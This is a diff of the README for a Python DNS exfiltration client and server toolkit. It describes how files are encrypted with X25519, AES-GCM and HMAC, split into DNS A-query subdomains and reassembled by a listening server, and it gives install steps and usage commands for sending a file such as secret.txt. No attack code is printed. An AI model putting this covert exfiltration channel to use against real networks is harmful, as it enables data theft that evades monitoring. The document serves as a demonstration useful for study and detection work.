@@ -1,111 +1,145 @@
-# DNS Exfiltration Server
+# DNS Exfiltration Client & Server (v2.4)
 
-This is a DNS exfiltration server designed to receive encrypted file fragments via DNS A record queries. The system supports encrypted and authenticated transmission using modern cryptographic primitives.
+This toolkit demonstrates secure, authenticated DNS-based file exfiltration using modern cryptography:
 
-## 🔐 Key Features
-
-- **Perfect Forward Secrecy (PFS)** via ephemeral Elliptic Curve Diffie-Hellman (ECDH) using X25519
-- **Authenticated encryption** using AES-GCM with derived session keys
-- **Base32 encoding** for DNS-safe payloads
-- **UDP DNS server** that reassembles fragments and decrypts payloads on the fly
-- **Stateless file-based session reassembly** keyed by client ephemeral identifier
-- **Replay-resilient per-transfer encryption context** via ECDH
+- **Perfect Forward Secrecy** via ephemeral X25519 ECDH  
+- **Authenticated encryption** using AES-GCM for confidentiality + HMAC-SHA256 for integrity  
+- **Base32** payload encoding for DNS-safe transfers  
+- **Chunked UDP DNS A queries** for transport  
+- **Stateless session reassembly** on the server keyed by client UUID  
 
 ---
 
-## 🔧 How It Works
+## 🔧 Components
 
-1. **Key Exchange (ECDH):**
-   - Each client generates a new ephemeral X25519 key pair.
-   - The client sends its public key in Base32 chunks encoded in the DNS query (using chunk `0-0`).
-   - The server derives a shared secret using its private key and the client's public key.
-   - This secret is passed through an HKDF (HMAC-based Key Derivation Function) to produce a 256-bit AES-GCM key.
+1. **client.py**  
+   - Generates an ephemeral X25519 keypair per transfer  
+   - Sends your public key in Base32 chunks (`<id>-0-0-<pubkey>`)  
+   - Derives a per-transfer AES (32 B) + HMAC (16 B) key via HKDF  
+   - Encrypts your file with AES-GCM (12 B nonce)  
+   - Appends an HMAC-SHA256 tag to the ciphertext  
+   - Base32-encodes the combined blob, splits into 63-char subdomains, and issues DNS A queries  
+   - Retries missing chunks up to `MAX_RETRIES`  
 
-2. **Encrypted Data Transfer:**
-   - The client encrypts the file using the derived AES key with a 12-byte random nonce.
-   - The ciphertext is Base32-encoded (unpadded), then split into DNS-safe segments.
-   - Each segment is sent as a query of the format:
-     ```
-     <id>-<index>-<total>-<chunk>.<domain>
-     ```
-
-3. **Decryption and Reassembly:**
-   - When all chunks are received, the server Base32-decodes and AES-decrypts the full payload.
-   - The decrypted binary is saved to disk under the `output/` directory.
+2. **server.py**  
+   - Listens on UDP port 5300 for DNS A queries  
+   - Parses `<id>-<idx>-<total>-<fragment>` subdomains  
+   - On `idx=0,total=0`, reassembles client’s ephemeral public key and performs ECDH → HKDF  
+   - Buffers Base32 fragments, applies padding, and decodes via `base64.b32decode`  
+   - Splits out the last 32 bytes as HMAC tag and verifies it, then AES-GCM decrypts  
+   - Writes plaintext to `output/<id>.bin` and cleans up idle sessions  
 
 ---
 
-## 📂 Environment Variables
+## 📥 Installation
 
-Create a `.env` file in the root directory:
+```bash
+git clone https://github.com/bufo333/python-dns-exfiltration-client-server.git
+cd python-dns-exfiltration-client-server
+python3 -m venv venv
+source venv/bin/activate
+pip install -r requirements.txt
+```
+
+---
+
+## 🔒 Configuration
+
+Create a `.env` in the project root for the server:
 
 ```ini
-SERVER_PRIVATE_KEY=server.key
+SERVER_PRIVATE_KEY=./server.key
 ```
 
-The private key should be a 32-byte raw X25519 key. You can generate one with Python:
+- `server.key` must be a raw 32 B X25519 private key (no PEM header).  
+- Generate one in Bash:
+
+  ```bash
+  python3 - << 'EOF'
+  from cryptography.hazmat.primitives.asymmetric import x25519
+  from cryptography.hazmat.primitives import serialization
+  key = x25519.X25519PrivateKey.generate()
+  raw = key.private_bytes(
+    encoding=serialization.Encoding.Raw,
+    format=serialization.PrivateFormat.Raw,
+    encryption_algorithm=serialization.NoEncryption()
+  )
+  open('server.key','wb').write(raw)
+  EOF
+  ```
+
+---
+
+## 🚀 Usage
+
+### Start Server
 
 ```bash
-python -c "from cryptography.hazmat.primitives.asymmetric import x25519; from cryptography.hazmat.primitives import serialization; key = x25519.X25519PrivateKey.generate(); open('server.key', 'wb').write(key.private_bytes(encoding=serialization.Encoding.Raw, format=serialization.PrivateFormat.Raw, encryption_algorithm=serialization.NoEncryption()))"
+python server.py --port 5300 --domain example.com --output-dir output
 ```
 
-This file will be used automatically unless overridden with `--server-key`.
+By default, it reads `SERVER_PRIVATE_KEY` from `.env` (override with `--server-key`).
 
----
-
-## 🚀 Running the Server
+### Run Client
 
 ```bash
-python server.py --port 5300 --domain xf.example.com
+python client.py \
+  --server-ip 127.0.0.1 \
+  --server-port 5300 \
+  --domain example.com \
+  --server-pubkey server_public.key \
+  --file-path secret.txt
 ```
 
-Alternatively, provide your server key via `.env`.
+The client first exchanges keys (`0-0` subdomain) then sends encrypted + HMAC-tagged chunks:  
+`<id>-<i>-<total>-<data>`
 
 ---
 
-## 🔐 Cryptographic Design: Ephemeral Key Exchange
+## 🔍 What HMAC Adds
 
-This system is designed with **Perfect Forward Secrecy** in mind:
-
-- Clients generate a fresh X25519 ephemeral key for each file transfer.
-- The server's static private key (provided via `.env`) is used to derive a shared secret.
-- This secret is then fed into an HKDF to derive a per-transfer AES-GCM key.
-- The AES key is used only once — for the current file transfer.
-
-This ensures that even if a long-term key is compromised, past data cannot be decrypted.
+- **Integrity**: ensures ciphertext wasn’t altered  
+- **Authentication**: only someone with the HMAC key can produce valid tags  
 
 ---
 
-## ⚠️ Notes on Security
+## ⚙️ CLI Reference
 
-- Every transfer uses a fresh ephemeral keypair, ensuring **forward secrecy**.
-- AES-GCM provides **integrity and confidentiality**.
-- Replay protection and client authentication are not currently implemented — consider adding HMAC or signatures for production scenarios.
-- Sessions are ephemeral and stateless beyond active memory — no persistent logs are maintained.
+**Server**:
+
+```text
+usage: server.py [-h] [--port PORT] [--output-dir DIR]
+                 [--low LOW] [--high HIGH]
+                 [--domain DOMAIN] [--server-key PATH]
+```
+
+**Client**:
+
+```text
+usage: client.py [-h] [--server-ip IP] [--server-port PORT]
+                 [--domain DOMAIN] [--server-pubkey PATH]
+                 --file-path FILE_PATH
+```
 
 ---
 
 ## 📁 Output
 
-Decrypted files are saved to the output directory (`--output-dir`, default: `output/`).
+Decrypted files land in `--output-dir` (default `output/`). File names match the session ID.
 
 ---
 
-## 🧪 Interoperability
+## 🛡️ Security Notes
 
-This server is designed to interoperate with the [Python or Go-based DNS exfiltration client](https://github.com/bufo333/python-dns-exfiltration-client-server), provided they conform to the same key-exchange and chunking conventions.
-
----
-
-## 🛠️ Options
-
-```bash
-usage: server.py [-h] [--port PORT] [--output-dir DIR] [--low LOW] [--high HIGH] [--domain DOMAIN] [--server-key PATH]
-```
+- Fresh ECDH key per transfer → **forward secrecy**  
+- AES-GCM + HMAC → **confidentiality**, **integrity**, **authentication**  
+- No persistent session state  
 
 ---
 
-## 👤 Author
+## 📜 License & Author
 
-John Burns — 2025-05-02  
-Version 2.2
+**Author:** John Burns  
+**Date:** 2025-05-02  
+**License:** GPL-3.0  
+```  
